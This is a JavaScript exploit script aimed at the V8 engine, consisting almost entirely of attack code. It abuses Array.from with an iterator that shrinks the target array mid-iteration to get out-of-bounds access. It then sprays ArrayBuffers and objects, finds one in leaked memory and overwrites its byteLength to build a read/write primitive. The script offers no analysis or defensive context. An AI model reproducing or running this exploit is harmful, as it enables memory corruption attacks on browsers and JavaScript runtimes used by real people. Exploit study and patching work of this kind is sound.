class ChangeType{
	constructor(){
		this.buf=new ArrayBuffer(8);
		this.f64=new Float64Array(this.buf);
		this.u32=new Uint32Array(this.buf);
	}
	f2i(val){
		this.f64[0]=val;
		return this.u32[1]*0x100000000+this.u32[0];
	}
	i2f(val){
		this.u32[0]=parseInt(val%0x100000000);
		this.u32[1]=parseInt((val-this.u32[0])/0x100000000);
		return this.f64[0];
	}
	
}
function hex(x)
{
   return '0x' + (x.toString(16)).padStart(16, 0);
}
var ct=new ChangeType(); 

let oobArray = [1.1];  //float
let arrays=[];	
let objs=[];		//for leak							
let maxSize = 1028 * 8;			//8224	
	
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => ( 
  {
    counter : 0,
    next() {
      let result = 1.1;
	this.counter++;
      if (this.counter > maxSize) {	 	
	 oobArray.length=1;	// !=0 void from be huishou by GC,Elements will point to a null pointer
	for(let i=0;i<100;i++)
	{
	    let array=new ArrayBuffer(0x512);
	    let obj={'a':0x1234,'b':0x5678};
	    arrays.push(array);
	    objs.push(obj);
	    //%DebugPrint(array);	
	}		
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });

let backing_store;
let kbitfield;
let buf_index;
for(let i=0;i<=maxSize;i++){let x=oobArray[i]}; //GC


//find ArrayBuffer in the shot
for(let i=0;i<maxSize;i++)
{
	let val=ct.f2i(oobArray[i]);
	if(val===0x51200000000)
	{
		backing_store=i+1;
		kbitfield=backing_store+1;
		console.log("[*]find target ArrayBuffer in oobArray number ["+i+"]");
		oobArray[i]=ct.i2f(0xbeaf00000000);
		break;
	}
}

for(let i=0;i<100;i++)
{	
	console.log(arrays[i].byteLength);
	if(arrays[i].byteLength===0xbeaf){
		
	   	console.log("[*]find target ArrayBuffer number ["+i+"]");
		buf_index=i;	
		let tmp=new Float64Array(arrays[buf_index],0,0x10);
		tmp[0]=ct.i2f(0xdeadbeef);
		break;
	}	
}
